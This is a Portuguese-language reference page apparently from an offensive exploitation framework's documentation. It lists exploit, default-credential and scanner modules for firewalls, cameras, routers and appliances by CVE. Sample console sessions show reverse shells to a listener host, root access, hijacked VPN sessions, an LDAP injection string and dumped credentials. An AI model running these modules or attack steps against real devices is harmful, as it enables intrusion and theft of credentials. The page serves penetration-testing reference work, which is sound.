# Referência de Vendors e Firewalls

**Idioma:** Português (pt-BR). **English:** [../en-US/23-vendor-reference-firewalls.md](../en-US/23-vendor-reference-firewalls.md)

---

## Visão geral

Esta página cataloga todos os vendors de dispositivos de rede suportados pelo EmbedXPL-Forge, organizados por categoria. Para cada vendor, lista os módulos disponíveis (exploits, creds, scanners) e os tipos de dispositivos cobertos.

---

## Firewalls e Appliances de Perímetro

### Fortinet

| Produto | Cobertura |
|---------|-----------|
| FortiGate / FortiOS | Auth bypass (CVE-2022-40684), SSL-VPN path traversal (CVE-2018-13379), SSL-VPN RCE (CVE-2024-21762, CVE-2023-27997), heap overflow |
| FortiClient EMS | RCE pre-auth (CVE-2026-35616) |
| FortiManager | FortiJump RCE (CVE-2024-47575) |
| FortiProxy | Auth bypass (CVE-2022-40684) |

**Módulos disponíveis:**

```
exploits/firewalls/fortinet/fortios_auth_bypass_cve_2022_40684
exploits/firewalls/fortinet/fortios_sslvpn_path_traversal_cve_2018_13379
exploits/firewalls/fortinet/fortios_sslvpn_rce_cve_2024_21762
exploits/firewalls/fortinet/fortigate_ssl_vpn_heap_overflow_cve_2023_27997
exploits/firewalls/fortinet/forticlient_ems_preauth_rce_cve_2026_35616
exploits/firewalls/fortinet/fortimanager_fortijump_cve_2024_47575
scanners/firewalls/fortinet/fortigate_sslvpn_scan
```

---

### Palo Alto Networks

| Produto | Cobertura |
|---------|-----------|
| PAN-OS GlobalProtect | Auth override cookie bypass (CVE-2026-0257), RCE não autenticado (CVE-2024-3400) |
| PAN-OS Prisma | Auth bypass (CVE-2025-0108) |

**Módulos disponíveis:**

```
exploits/firewalls/paloalto/globalprotect_auth_bypass_cve_2026_0257
exploits/firewalls/paloalto/panos_globalprotect_rce_cve_2024_3400
exploits/firewalls/paloalto/panos_auth_bypass_cve_2025_0108
scanners/firewalls/paloalto/panos_version_check
```

---

### Cisco (Firewalls e Switches)

| Produto | Cobertura |
|---------|-----------|
| Cisco ASA e FTD | Path traversal (CVE-2020-3452) |
| Cisco IOS | Smart Install RCE (CVE-2018-0171), SNMP RCE (CVE-2017-6742) |
| Cisco IOS XE | Escalada de privilégio WebUI (CVE-2023-20198), WLC JWT RCE (CVE-2025-20188) |
| Cisco RV320/RV325 | Injeção de comando (CVE-2019-1652), divulgação de info (CVE-2019-1653) |

**Módulos disponíveis:**

```
exploits/firewalls/cisco/asa_ftd_path_traversal_cve_2020_3452
exploits/cisco/cisco_ios_smart_install_rce_cve_2018_0171
exploits/network_os/cisco/ios_xe_webui_privesc_cve_2023_20198
exploits/routers/cisco/ios_xe_wlc_jwt_file_upload_cve_2025_20188
exploits/routers/cisco/rv320_command_injection
exploits/routers/cisco/rv300_rv320_information_disclosure_cve_2019_1653
creds/routers/cisco/ssh_default_creds
creds/routers/cisco/telnet_default_creds
```

---

### SonicWall

| Produto | Cobertura |
|---------|-----------|
| SonicOS SSL-VPN | Bypass de autenticação (CVE-2024-53704) |

**Módulos disponíveis:**

```
exploits/firewalls/sonicwall/sonicos_sslvpn_auth_bypass_cve_2024_53704
```

---

### Check Point

| Nome | CVE | CVSS | Tipo |
|------|-----|------|------|
| `checkpoint_vpn_lfi_chain_cve_2024_24919` | CVE-2024-24919 | 8.6 | LFI encadeado — leitura arbitrária de arquivo |
| `security_gateway_info_disclosure_cve_2024_24919` | CVE-2024-24919 | 8.6 | Divulgação de informações (variante) |
| `checkpoint_remote_code_exec_cve_2023_28461` | CVE-2023-28461 | 9.8 | RCE não autenticado |
| `checkpoint_gaia_portal_sqli_cve_2021_30358` | CVE-2021-30358 | 9.8 | SQL injection no portal Gaia |
| `endpoint_security_privesc_cve_2019_8461` | CVE-2019-8461 | 7.8 | Escalada de privilégio (cliente local) |

```
exploits/firewalls/checkpoint/checkpoint_vpn_lfi_chain_cve_2024_24919
exploits/firewalls/checkpoint/security_gateway_info_disclosure_cve_2024_24919
exploits/firewalls/checkpoint/checkpoint_remote_code_exec_cve_2023_28461
exploits/firewalls/checkpoint/checkpoint_gaia_portal_sqli_cve_2021_30358
exploits/firewalls/checkpoint/endpoint_security_privesc_cve_2019_8461
```

**Sessão terminal — CVE-2023-28461 (Check Point Quantum RCE):**

```
exf > use exploits/firewalls/checkpoint/checkpoint_remote_code_exec_cve_2023_28461
exf (Check Point Quantum Gateway RCE CVE-2023-28461) > set target 203.0.113.50
[+] target => 203.0.113.50
exf (Check Point Quantum Gateway RCE CVE-2023-28461) > set lhost 10.0.0.99
[+] lhost => 10.0.0.99
exf (Check Point Quantum Gateway RCE CVE-2023-28461) > check
[*] Verificando Check Point Quantum Security Gateway em 203.0.113.50:443...
[+] Check Point Quantum R81.20 detectado (take 7)
[+] Alvo vulnerável — R81.20 < Take 8 (limite de correção)
exf (Check Point Quantum Gateway RCE CVE-2023-28461) > run
[*] Enviando requisição HTTPS malformada para a API de configuração de rede...
[*] Payload aciona escrita fora dos limites no processo cpwd (escalada pós-autenticação)...
[+] Crash do processo + reinicialização com shellcode injetado
[*] Iniciando reverse shell...
[+] Shell recebido!
exf (Check Point Quantum Gateway RCE CVE-2023-28461) > shell
$ id
uid=0(root) gid=0(root) groups=0(root)
$ cpstat os
Product version: R81.20
Operating system: Gaia
```

---

### Juniper Networks

| Nome | CVE | CVSS | Tipo |
|------|-----|------|------|
| `juniper_srx_unauth_rce_cve_2025_21590` | CVE-2025-21590 | 9.8 | RCE não autenticado |
| `jweb_oob_write_rce_cve_2024_21591` | CVE-2024-21591 | 9.8 | Escrita fora dos limites J-Web (RCE) |
| `jweb_php_rce_cve_2023_36845` | CVE-2023-36845 | 9.8 | RCE via env PHP do J-Web |
| `juniper_srx_file_upload_rce_cve_2023_36851` | CVE-2023-36851 | 5.3 | Upload de arquivo não autenticado |
| `juniper_ex_auth_bypass_cve_2019_0028` | CVE-2019-0028 | 9.8 | Bypass de autenticação J-Web |

```
exploits/firewalls/juniper/juniper_srx_unauth_rce_cve_2025_21590
exploits/firewalls/juniper/jweb_oob_write_rce_cve_2024_21591
exploits/firewalls/juniper/jweb_php_rce_cve_2023_36845
exploits/firewalls/juniper/juniper_srx_file_upload_rce_cve_2023_36851
exploits/firewalls/juniper/juniper_ex_auth_bypass_cve_2019_0028
```

---

## Câmeras IP e NVRs

### Hikvision

Uma das marcas mais exploradas globalmente.

| Produto | CVEs | Módulos |
|---------|------|---------|
| DS-2CD series (câmeras IP) | CVE-2021-36260, CVE-2017-7921, CVE-2023-28808 | 14 módulos |
| DS-7000/9000 NVR | CVE-2021-36260 variantes, hash de firmware | 8 módulos |
| DS-KD8003 Intercom | Série r0_intercom (3DES, GPIO, SUID) | 7 módulos |

```
exploits/cameras/hikvision/rtsp_rce_cve_2021_36260
exploits/cameras/hikvision/info_disclosure_cve_2017_7921
exploits/cameras/hikvision/nas_auth_bypass_cve_2023_28808
exploits/cameras/hikvision/firmware_crypto_key_extract
exploits/cameras/hikvision/nvr_dvr_serial_privesc
exploits/cameras/hikvision/psh_challenge_predictor
exploits/cameras/hikvision/psh_command_injection
exploits/cameras/hikvision/psh_debug_rsa1024_bypass
exploits/cameras/hikvision/r0_intercom_3des_decrypt
exploits/cameras/hikvision/r0_intercom_developer_nfs
exploits/cameras/hikvision/r0_intercom_gpio_door_unlock
exploits/cameras/hikvision/r0_intercom_ssh_default_bypass
exploits/cameras/hikvision/r0_intercom_ssh_mitm
exploits/cameras/hikvision/r0_intercom_suid_privesc
creds/cameras/hikvision/ftp_default_creds
creds/cameras/hikvision/ssh_default_creds
creds/cameras/hikvision/telnet_default_creds
scanners/cameras/hikvision/boot_permission_audit
scanners/cameras/hikvision/eglibc_version_check
scanners/cameras/hikvision/firmware_version_fingerprint
scanners/cameras/hikvision/nvr_binary_hardening_audit
scanners/cameras/hikvision/r0_intercom_firmware_audit
scanners/cameras/hikvision/r0_intercom_network_detect
```

---

### Dahua

| Produto | CVEs | Módulos |
|---------|------|---------|
| Câmeras IP e NVRs | CVE-2021-33044, CVE-2021-36260, CVE-2020-25078, CVE-2013-6117 | 11 módulos |

```
exploits/cameras/dahua/auth_bypass_cve_2021_33044
exploits/cameras/dahua/cctv_auth_bypass_cve_2021_33044
exploits/cameras/dahua/cctv_rce_cve_2021_36260
exploits/cameras/dahua/cctv_37777_credential_extraction
exploits/cameras/dahua/cctv_firmware_upload_no_verify
exploits/cameras/dahua/cctv_pem_key_extraction
exploits/cameras/dahua/cctv_username_disclosure_cve_2020_25078
exploits/cameras/dahua/dvr_auth_bypass_cve_2013_6117
creds/cameras/dahua/ftp_default_creds
creds/cameras/dahua/ssh_default_creds
creds/cameras/dahua/telnet_default_creds
creds/cameras/dahua/webinterface_http_auth_default_creds
scanners/cameras/dahua/cctv_discover
scanners/cameras/dahua/firmware_version_fingerprint
scanners/cameras/dahua/p2p_pppp_scan
```

---

### Herospeed / Longsee (MC6830 Platform)

OEM platform afetando Herospeed, TVT Digital, GISE, Longse, Zintronic, Turing AI, Speco, Alibi Security, IRBIS.

```
exploits/cameras/herospeed/herospeed_nvr_unauth_account_enum
exploits/cameras/herospeed/herospeed_nvr_vbhtm_cred_disclosure
exploits/cameras/herospeed/herospeed_nvr_upgrade_source_injection_rce
exploits/cameras/herospeed/herospeed_nvr_hardcoded_root_hash
exploits/cameras/herospeed/herospeed_nvr_config_export_cred_recovery
exploits/cameras/herospeed/herospeed_nvr_ftp_diagnostic_rce
exploits/cameras/herospeed/herospeed_nvr_ftp_sqlite_injection_rce
exploits/cameras/herospeed/herospeed_nvr_rce
exploits/cameras/herospeed/herospeed_nvr_telnet_safecode_backdoor
exploits/cameras/herospeed/herospeed_nvr_paramconfig_bypass
exploits/cameras/herospeed/herospeed_nvr_camera_creds_decrypt
exploits/cameras/herospeed/herospeed_nvr_v6_db_decryptor
scanners/cameras/herospeed_longsee_nvr_scan
```

---

### Intelbras

Câmeras e NVRs OEM Dahua/Hikvision para o mercado brasileiro.

```
exploits/cameras/intelbras/cctv_dahua_auth_bypass
exploits/cameras/intelbras/cctv_dahua_rce_cve_2021_36260
exploits/cameras/intelbras/cctv_dahua_username_disclosure
creds/cameras/intelbras/webinterface_default_creds
scanners/cameras/intelbras_boa_detect
scanners/cameras/intelbras_cctv_discover
scanners/cameras/intelbras_onvif_scan
scanners/cameras/intelbras_p2p_uid_scan
scanners/cameras/intelbras_pvip_discover
```

---

## Roteadores SOHO

### TP-Link

| Produto | CVEs | Tipo |
|---------|------|------|
| TL-WR841N | CVE-2023-50224, CVE-2025-9377 | Divulgação de creds, RCE parental control |
| Archer C5/C7 | Múltiplos | DNS Hijack APT28 |
| Archer C6, TL-WR740N, WDR série | Múltiplos | DNS Hijack |

```
exploits/routers/tplink/wr841n_credential_disclosure_cve_2023_50224
exploits/routers/tplink/wr841n_parental_control_rce_cve_2025_9377
exploits/routers/tplink/multi_dns_hijack_apt28
exploits/routers/tplink/apt28_full_chain_autopwn
creds/routers/tplink/ssh_default_creds
creds/routers/tplink/telnet_default_creds
creds/routers/tplink/http_default_creds
```

### Huawei

| Produto | Tipo |
|---------|------|
| EG8145X6 (GPON ONT) | CSRF static token, info disclosure, config dump |
| HG8245 | Default creds, config dump |
| ZTE H168N | RCE e auth bypass |

```
exploits/routers/huawei/eg8145x6_csrf_static_token
exploits/routers/huawei/eg8145x6_info_disclosure
exploits/routers/huawei/hg8245_default_creds
exploits/routers/huawei/hg8245_config_dump
```

### MikroTik

| Produto | CVEs | Tipo |
|---------|------|------|
| RouterOS < 6.42 | CVE-2018-14847 | Divulgação de creds via Winbox |
| RouterOS qualquer | — | DNS Hijack APT28/Sandworm |

```
exploits/routers/mikrotik/winbox_cred_disclosure_cve_2018_14847
exploits/routers/mikrotik/routeros_dns_hijack_apt28
exploits/routers/mikrotik/routeros_jailbreak
```

---

## BMC / IPMI

| Vendor | Produto | CVE | Módulo |
|--------|---------|-----|--------|
| Supermicro | IPMI 2.0 | CVE-2013-4786 | `exploits/bmc/supermicro/ipmi_auth_bypass_cve_2013_4786` |
| Dell | iDRAC9 | CVE-2021-36300 | `exploits/bmc/dell/idrac9_info_disclosure_cve_2021_36300` |
| ASUS | ASMB8 IPMI | — | `exploits/bmc/asus/asmb8_default_creds_ipmi` |

---

## Appliances de rede

### F5 Networks

| Produto | CVE | Tipo |
|---------|-----|------|
| BIG-IP iControl REST | CVE-2022-1388 | RCE não autenticado |
| BIG-IQ iControl | CVE-2021-22986 | RCE |

```
exploits/appliances/f5/bigip_icontrol_rest_rce_cve_2022_1388
exploits/appliances/f5/bigip_bigiq_icontrol_rce_cve_2021_22986
```

### Citrix / NetScaler

| Produto | CVE | CVSS | Tipo |
|---------|-----|------|------|
| NetScaler ADC/Gateway | CVE-2019-19781 | 9.8 | Path traversal (Shitrix) |
| NetScaler ADC/Gateway | CVE-2023-3519 | 9.8 | RCE não autenticado |
| NetScaler ADC/Gateway | CVE-2023-4966 | 9.4 | CitrixBleed — vazamento de token de sessão |

```
exploits/appliances/citrix/netscaler_path_traversal_cve_2019_19781
exploits/appliances/citrix/netscaler_rce_cve_2023_3519
exploits/appliances/citrix/citrix_bleed_info_disclosure_cve_2023_4966
```

**Sessão terminal — CVE-2023-4966 (CitrixBleed):**

```
exf > use exploits/appliances/citrix/citrix_bleed_info_disclosure_cve_2023_4966
exf (CitrixBleed CVE-2023-4966) > set target 10.0.80.1
[+] target => 10.0.80.1
exf (CitrixBleed CVE-2023-4966) > check
[*] Verificando NetScaler em 10.0.80.1:443...
[+] NetScaler ADC 14.1.8.40 detectado
[+] Alvo vulnerável — versão < 14.1-8.50 (CitrixBleed)
exf (CitrixBleed CVE-2023-4966) > run
[*] Enviando requisição HTTP com Host header superdimensionado...
[+] Resposta contém 264 bytes extras (memória fora dos limites)
[+] Token de sessão AAA extraído: NSC_b6f2e...1a9c4
[+] Sessão sequestrada como: corp\svc-vpnuser (acesso VPN confirmado)
```

---

### Aruba ClearPass

| Produto | CVE | CVSS | Tipo |
|---------|-----|------|------|
| ClearPass Policy Manager | CVE-2023-25594 | 9.8 | RCE não autenticado |
| ClearPass Policy Manager | CVE-2022-37897 | 9.8 | SQL injection |

```
exploits/nac/aruba/aruba_clearpass_rce_cve_2023_25594
exploits/nac/aruba/aruba_clearpass_sqli_cve_2022_37897
```

**Sessão terminal — CVE-2023-25594 (ClearPass RCE não autenticado):**

```
exf > use exploits/nac/aruba/aruba_clearpass_rce_cve_2023_25594
exf (Aruba ClearPass RCE CVE-2023-25594) > set target 10.0.90.5
[+] target => 10.0.90.5
exf (Aruba ClearPass RCE CVE-2023-25594) > set lhost 10.0.0.99
[+] lhost => 10.0.0.99
exf (Aruba ClearPass RCE CVE-2023-25594) > check
[*] Verificando Aruba ClearPass em 10.0.90.5:443...
[+] ClearPass Policy Manager 6.11.4 detectado
[+] Alvo vulnerável — versão < 6.11.5
exf (Aruba ClearPass RCE CVE-2023-25594) > run
[*] Explorando validação incorreta de entrada no handler de registro do portal guest...
[+] Injeção de comando confirmada — uid=0(root)
[*] Reverse shell para 10.0.0.99:4444 iniciado...
[+] Shell recebido!
exf (Aruba ClearPass RCE CVE-2023-25594) > shell
# id
uid=0(root) gid=0(root) groups=0(root)
# hostname
clearpass-primary.corp.internal
```

---

### Sangfor

| Produto | CVE | CVSS | Tipo |
|---------|-----|------|------|
| NGFW (Next Generation Firewall) | CVE-2019-13393 | 9.8 | RCE não autenticado |

```
exploits/firewalls/sangfor/sangfor_ngfw_unauth_rce_cve_2019_13393
```

**Sessão terminal — CVE-2019-13393 (Sangfor NGFW RCE não autenticado):**

```
exf > use exploits/firewalls/sangfor/sangfor_ngfw_unauth_rce_cve_2019_13393
exf (Sangfor NGFW Unauth RCE CVE-2019-13393) > set target 10.0.70.1
[+] target => 10.0.70.1
exf (Sangfor NGFW Unauth RCE CVE-2019-13393) > set lhost 10.0.0.99
[+] lhost => 10.0.0.99
exf (Sangfor NGFW Unauth RCE CVE-2019-13393) > check
[*] Verificando portal de gerenciamento Sangfor NGFW em 10.0.70.1:443...
[+] Sangfor NGFW detectado (título da página: "Sangfor NGFW")
[+] Alvo vulnerável — endpoint de RCE pré-auth exposto
exf (Sangfor NGFW Unauth RCE CVE-2019-13393) > run
[*] Enviando requisição não autenticada ao endpoint vulnerável da API de gerenciamento...
[+] RCE confirmado (uid=0 na resposta)
[*] Reverse shell para 10.0.0.99:4444 iniciado...
[+] Shell recebido!
exf (Sangfor NGFW Unauth RCE CVE-2019-13393) > shell
# id
uid=0(root) gid=0(root) groups=0(root)
# cat /etc/sangfor/version
NGFW Version: 8.0.5
```

---

### OpenVPN Access Server

| Produto | CVE | CVSS | Tipo |
|---------|-----|------|------|
| OpenVPN Access Server < 2.11.1 | CVE-2023-46853 | 9.8 | Bypass de auth via REST API (pre-auth) |
| OpenVPN Access Server 2.9.x < 2.9.4 / 2.8.x < 2.8.8 (LDAP) | CVE-2022-0547 | 9.8 | Bypass de auth via injeção LDAP |

```
exploits/firewalls/openvpn/openvpn_as_auth_bypass_cve_2023_46853
exploits/firewalls/openvpn/openvpn_as_auth_bypass_cve_2022_0547
```

**Sessão terminal — CVE-2023-46853 (OpenVPN AS REST API auth bypass):**

```text
exf > use exploits/firewalls/openvpn/openvpn_as_auth_bypass_cve_2023_46853
exf (OpenVPN AS REST API Auth Bypass CVE-2023-46853) > set target 10.0.200.5
[+] target => 10.0.200.5
exf (OpenVPN AS REST API Auth Bypass CVE-2023-46853) > set port 943
[+] port => 943
exf (OpenVPN AS REST API Auth Bypass CVE-2023-46853) > check
[*] Verificando REST API do OpenVPN Access Server em 10.0.200.5:943...
[+] OpenVPN Access Server 2.10.0 detectado (header X-AS-Version)
[+] Alvo vulnerável — AS 2.10.0 < 2.11.1 (limite da correção)
exf (OpenVPN AS REST API Auth Bypass CVE-2023-46853) > run
[*] Estágio 1: Verificando REST API do OpenVPN AS...
[+] OpenVPN Access Server confirmado em /api/v1/config/access_server/
[*] Estágio 2: Enviando payload de bypass de autenticação...
[+] Bypass de autenticação BEM-SUCEDIDO -- dados de configuração retornados!
[*] Estágio 3: Extraindo credenciais da resposta de configuração...
[+] LDAP bind DN: CN=svc-vpn,DC=corp,DC=internal
[+] Senha LDAP bind: VpnBind@2024!
[*] Estágio 4: Enumerando contas de usuário VPN...
[+] Usuários VPN encontrados (12):
    [*] john.corp
    [*] jane.corp
    [*] svc.backup
    [*] admin
    ... (8 adicionais)
[*] Estágio 5: Extraindo certificados CA e servidor...
[+] Certificados extraídos (3):
    [*] ca.crt: -----BEGIN CERTIFICATE----- (47 linhas)
    [*] server.crt: -----BEGIN CERTIFICATE----- (31 linhas)
    [*] tls_auth: -----BEGIN OpenVPN Static key V1----- (22 linhas)
[+] Exploração CVE-2023-46853 concluída em 10.0.200.5:943
```

**Sessão terminal — CVE-2022-0547 (OpenVPN AS injeção LDAP):**

```text
exf > use exploits/firewalls/openvpn/openvpn_as_auth_bypass_cve_2022_0547
exf (OpenVPN AS LDAP Auth Bypass CVE-2022-0547) > set target 10.0.200.10
[+] target => 10.0.200.10
exf (OpenVPN AS LDAP Auth Bypass CVE-2022-0547) > check
[*] Verificando interface admin do OpenVPN AS em 10.0.200.10:943...
[+] Interface admin do OpenVPN Access Server detectada em /admin/
[+] Indicadores de backend LDAP encontrados
exf (OpenVPN AS LDAP Auth Bypass CVE-2022-0547) > run
[*] Estágio 2: Verificando backend de autenticação LDAP...
[+] Backend LDAP detectado -- alvo provavelmente vulnerável
[*] Estágio 3: Tentando bypass via injeção LDAP...
[+] Injeção LDAP BEM-SUCEDIDA: usuário 'admin)(&(objectClass=*)' senha 'x'
[+] Token de sessão: as_sessid=a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6
[+] Usuários VPN (8): john.doe, jane.smith, vpn-backup, admin...
[+] Exploração CVE-2022-0547 concluída em 10.0.200.10:943
```

---

### Arista Networks

| Produto | CVE | CVSS | Tipo |
|---------|-----|------|------|
| Arista EOS 4.24.x–4.27.x (eAPI habilitado) | CVE-2023-24512 | 9.8 | Bypass de auth REST API (eAPI) + execução de CLI |

```
exploits/firewalls/arista/arista_eos_rest_api_bypass_cve_2023_24512
```

**Sessão terminal — CVE-2023-24512 (Arista EOS REST API bypass):**

```text
exf > use exploits/firewalls/arista/arista_eos_rest_api_bypass_cve_2023_24512
exf (Arista EOS REST API Auth Bypass CVE-2023-24512) > set target 10.0.210.1
[+] target => 10.0.210.1
exf (Arista EOS REST API Auth Bypass CVE-2023-24512) > check
[*] Verificando eAPI do Arista EOS em 10.0.210.1:443...
[+] Arista EOS 4.27.3M detectado (fingerprint eAPI confirmado)
[+] Alvo vulnerável — EOS 4.27.3M < 4.27.4M (limite da correção)
exf (Arista EOS REST API Auth Bypass CVE-2023-24512) > run
[*] Estágio 1: Verificando endpoint eAPI do Arista EOS...
[+] Versão Arista EOS: 4.27.3M
[+] EOS 4.27.3M confirmado VULNERÁVEL
[*] Estágio 2: Enviando requisição de bypass de autenticação...
[+] Bypass de autenticação BEM-SUCEDIDO -- eAPI retornou 200!
[*] Estágio 3: Executando comando CLI: show version
[+] Saída do comando:
    Arista Networks EOS
    Software image version: 4.27.3M
    System MAC address:  52:54:00:ab:cd:ef
    Model:               DCS-7050CX3-32S
[*] Estágio 4: Extraindo configuração em execução...
[+] Running config extraída (847 linhas)
    username admin privilege 15 role network-admin secret sha512 $6$...
    management api http-commands
       no shutdown
[*] Estágio 5: Enumerando contas de usuário...
[+] Contas de usuário:
    admin    (network-admin)  netops (network-operator)  monitor (read-only)
[+] Exploração CVE-2023-24512 concluída em 10.0.210.1:443
```

---

## Access Points (APs)

### MediaTek MT7622

| Tipo | Módulos |
|------|---------|
| Pre-auth heap/stack overflow | `exploits/aps/mediatek/mt7622_heap_overflow_preauth` |
| Post-auth heap/stack overflow | `exploits/aps/mediatek/mt7622_heap_overflow_postauth` |

---

## Impressoras

### HP

| Produto | Tipo | Módulo |
|---------|------|--------|
| HP LaserJet (PJL) | Leitura de sistema de arquivos via PJL | `scanners/printers/hp_rawprint_9100` |
| HP (geral) | CVEs múltiplos | `exploits/printers/hp/...` |

O módulo `embedxpl-printer-vuln.nse` verifica 11 vendors de impressoras (HP, Canon, Lexmark, Xerox, Ricoh, Brother, Epson, Kyocera, Samsung) via PJL, IPP e HTTP.

---

## Firewalls, UTM e Appliances de Rede — Vendors Adicionais

### Sophos

| Nome | CVE | CVSS | Tipo |
|------|-----|------|------|
| `firewall_code_injection_cve_2022_3236` | CVE-2022-3236 | 9.8 | Injeção de código (user portal) |
| `xg_auth_bypass_cve_2022_1040` | CVE-2022-1040 | 9.8 | Bypass de autenticação |
| `xg_sqli_asnarok_cve_2020_12271` | CVE-2020-12271 | 9.8 | SQL injection (campanha Asnarok 2020) |

```
exploits/firewalls/sophos/firewall_code_injection_cve_2022_3236
exploits/firewalls/sophos/xg_auth_bypass_cve_2022_1040
exploits/firewalls/sophos/xg_sqli_asnarok_cve_2020_12271
```

**Sessão terminal — CVE-2020-12271 (Sophos XG SQLi Asnarok):**

```
exf > use exploits/firewalls/sophos/xg_sqli_asnarok_cve_2020_12271
exf (Sophos XG SQLi Asnarok CVE-2020-12271) > set target 10.0.50.1
[+] target => 10.0.50.1
exf (Sophos XG SQLi Asnarok CVE-2020-12271) > check
[*] Verificando Sophos XG em 10.0.50.1:443...
[+] Sophos XG Firewall v17.5 MR12 detectado
[+] Alvo vulnerável — endpoint SQLi Asnarok (/userman/) exposto
exf (Sophos XG SQLi Asnarok CVE-2020-12271) > run
[*] Injetando SQL no endpoint /userportal/Controller?mode=30&product=...
[+] SQLi confirmado — extraindo credenciais de administrador do PostgreSQL...
[+] Hash do admin: $apr1$R3Ks7Z1B$...
[+] Sessão admin: 3a4b5c6d-7e8f-9012-abcd-ef1234567890
[*] Extraindo credenciais VPN do banco sqlite...
[+] Usuários VPN: john.doe:VpnPass123, jane.smith:Corp@VPN456
```

---

### WatchGuard

| Nome | CVE | CVSS | Tipo |
|------|-----|------|------|
| `firebox_auth_bypass_cve_2022_26776` | CVE-2022-26776 | 9.8 | Bypass de autenticação |
| `firebox_cyclops_blink_cve_2022_23176` | CVE-2022-23176 | 8.8 | Implante Cyclops Blink (estado-nação) |
| `xcs_9_rce` | — | Crítico | RCE no WatchGuard XCS 9.x |

```
exploits/firewalls/watchguard/firebox_auth_bypass_cve_2022_26776
exploits/firewalls/watchguard/firebox_cyclops_blink_cve_2022_23176
exploits/firewalls/watchguard/xcs_9_rce
```

---

### Zyxel

| Nome | CVE | CVSS | Tipo |
|------|-----|------|------|
| `buffer_overflow_cve_2023_33009` | CVE-2023-33009 | 9.8 | Buffer overflow |
| `ike_cmd_injection_cve_2023_28771` | CVE-2023-28771 | 9.8 | Injeção de comando via daemon IKEv2 |
| `usg_flex_cmd_injection_cve_2022_30525` | CVE-2022-30525 | 9.8 | Injeção de comando não autenticada |

```
exploits/firewalls/zyxel/buffer_overflow_cve_2023_33009
exploits/firewalls/zyxel/ike_cmd_injection_cve_2023_28771
exploits/firewalls/zyxel/usg_flex_cmd_injection_cve_2022_30525
```

---

### pfSense

| Nome | CVE | CVSS | Tipo |
|------|-----|------|------|
| `pfblockerng_rce_cve_2022_31814` | CVE-2022-31814 | 9.8 | RCE não autenticado (pfBlockerNG) |
| `pfsense_csrf_rce_cve_2019_16667` | CVE-2019-16667 | 9.8 | CSRF para RCE |
| `antibruteforce_bypass_cve_2023_27100` | CVE-2023-27100 | 9.8 | Bypass de anti-brute-force |
| `interfaces_cmd_injection_cve_2023_42326` | CVE-2023-42326 | 9.8 | Injeção de comando via interfaces |
| `pfsense_rrd_cmd_injection_cve_2023_27253` | CVE-2023-27253 | 8.8 | Injeção de comando via RRD |

```
exploits/firewalls/pfsense/pfblockerng_rce_cve_2022_31814
exploits/firewalls/pfsense/pfsense_csrf_rce_cve_2019_16667
exploits/firewalls/pfsense/antibruteforce_bypass_cve_2023_27100
exploits/firewalls/pfsense/interfaces_cmd_injection_cve_2023_42326
exploits/firewalls/pfsense/pfsense_rrd_cmd_injection_cve_2023_27253
```

---

### OPNsense

| Nome | CVE | CVSS | Tipo |
|------|-----|------|------|
| `opnsense_sqli_rce_cve_2021_23239` | CVE-2021-23239 | 9.8 | SQL injection para RCE |
| `opnsense_auth_bypass_cve_2022_0993` | CVE-2022-0993 | 8.8 | Bypass de autenticação |

```
exploits/firewalls/opnsense/opnsense_sqli_rce_cve_2021_23239
exploits/firewalls/opnsense/opnsense_auth_bypass_cve_2022_0993
```

---

### Stormshield SNS

| Nome | CVE | CVSS | Tipo |
|------|-----|------|------|
| `stormshield_sns_rce_cve_2020_18175` | CVE-2020-18175 | 9.8 | RCE na interface de gerenciamento |
| `stormshield_sns_auth_bypass_cve_2023_23770` | CVE-2023-23770 | 9.1 | Bypass de autenticação |

```
exploits/firewalls/stormshield/stormshield_sns_rce_cve_2020_18175
exploits/firewalls/stormshield/stormshield_sns_auth_bypass_cve_2023_23770
```

---

### VyOS

| Nome | CVE | CVSS | Tipo |
|------|-----|------|------|
| `vyos_rce_cve_2023_31992` | CVE-2023-31992 | 9.8 | RCE via API REST |
| `vyos_openvpn_injection_cve_2021_35278` | CVE-2021-35278 | 8.8 | Injeção de configuração OpenVPN — execução de comando OS |

```
exploits/firewalls/vyos/vyos_rce_cve_2023_31992
exploits/firewalls/vyos/vyos_openvpn_injection_cve_2021_35278
```

---

### IPFire

| Nome | CVE | CVSS | Tipo |
|------|-----|------|------|
| `ipfire_rce_cve_2019_18981` | CVE-2019-18981 | 9.8 | Injeção de rede via CGI |
| `ipfire_ids_cmd_inject_cve_2023_46226` | CVE-2023-46226 | 8.8 | Injeção de comando via rule_path IDS |

```
exploits/firewalls/ipfire/ipfire_rce_cve_2019_18981
exploits/firewalls/ipfire/ipfire_ids_cmd_inject_cve_2023_46226
```

---

### Kerio Control

| Nome | CVE | CVSS | Tipo |
|------|-----|------|------|
| `kerio_control_rce_cve_2024_52875` | CVE-2024-52875 | 9.8 | RCE não autenticado |
| `kerio_control_rce_cve_2022_24665` | CVE-2022-24665 | 9.8 | RCE não autenticado via CSRF |

```
exploits/firewalls/kerio/kerio_control_rce_cve_2024_52875
exploits/firewalls/kerio/kerio_control_rce_cve_2022_24665
```

---

### Hillstone Networks

| Nome | CVE | CVSS | Tipo |
|------|-----|------|------|
| `hillstone_stoneos_web_rce_cve_2024_5829` | CVE-2024-5829 | 9.8 | RCE na interface de gerenciamento web |
| `hillstone_ngfw_rce_cve_2023_31493` | CVE-2023-31493 | 9.8 | RCE não autenticado (StoneOS) |

```
exploits/firewalls/hillstone/hillstone_stoneos_web_rce_cve_2024_5829
exploits/firewalls/hillstone/hillstone_ngfw_rce_cve_2023_31493
```

---

### Hirschmann / Belden

| Nome | CVE | CVSS | Tipo |
|------|-----|------|------|
| `hirschmann_classic_rce_cve_2020_6994` | CVE-2020-6994 | 9.8 | RCE via autenticação Hirschmann clássica |
| `hirschmann_cms_rce_cve_2019_11831` | CVE-2019-11831 | 9.8 | RCE via interface de gerenciamento CMS |

```
exploits/firewalls/hirschmann/hirschmann_classic_rce_cve_2020_6994
exploits/firewalls/hirschmann/hirschmann_cms_rce_cve_2019_11831
```

---

### H3C (New H3C Group)

Vendor chinês amplamente implantado em ambientes governamentais e corporativos.

| Nome | CVE | CVSS | Tipo |
|------|-----|------|------|
| `h3c_ngfw_rce_cve_2022_35534` | CVE-2022-35534 | 9.8 | Injeção de comando OS no NGFW |
| `h3c_secpath_auth_bypass_cve_2019_20224` | CVE-2019-20224 | 9.8 | Bypass de autenticação SecPath |

**Sessão terminal — CVE-2022-35534 (H3C NGFW RCE):**

```
exf > use exploits/firewalls/h3c/h3c_ngfw_rce_cve_2022_35534
exf (H3C NGFW RCE CVE-2022-35534) > set target 192.168.1.1
[+] target => 192.168.1.1
